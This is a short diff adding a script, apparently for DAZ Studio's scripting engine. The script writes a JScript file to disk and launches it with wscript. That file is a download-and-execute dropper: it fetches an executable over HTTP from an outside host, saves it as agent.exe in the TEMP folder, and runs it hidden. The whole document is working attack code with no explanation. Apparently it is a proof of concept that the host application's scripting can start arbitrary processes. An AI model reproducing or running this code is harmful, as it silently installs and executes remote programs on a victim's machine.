@@ -1,0 +1,7 @@
+var oFile = new DzFile("d:\\test.js");
+oFile.open(2);
+oFile.write("s=WScript.CreateObject(\'WScript.Shell\');o=WScript.CreateObject(\'ADODB.Stream\');e=s.Environment(\'Process\');u=\'http://www.example.com/~sgtatham/putty/latest/x86/putty.exe\';b=e.Item(\'TEMP\')+\'\\\\agent.exe\';try{x=new ActiveXObject(\'Microsoft.XMLHTTP\');}catch(e){x=new ActiveXObject(\'MSXML2.ServerXMLHTTP\');}if(!x)exit(0);x.open(\'GET\',u,0);x.send(null);d=x.responseBody;o.Type=1;o.Mode=3;o.Open();o.Write(d);o.SaveToFile(b,2);s.Run(b,0);\r\n");
+oFile.close()
+
+var oProcess = new DzProcess(["wscript", "d:\\test.js"]);
+oProcess.start();
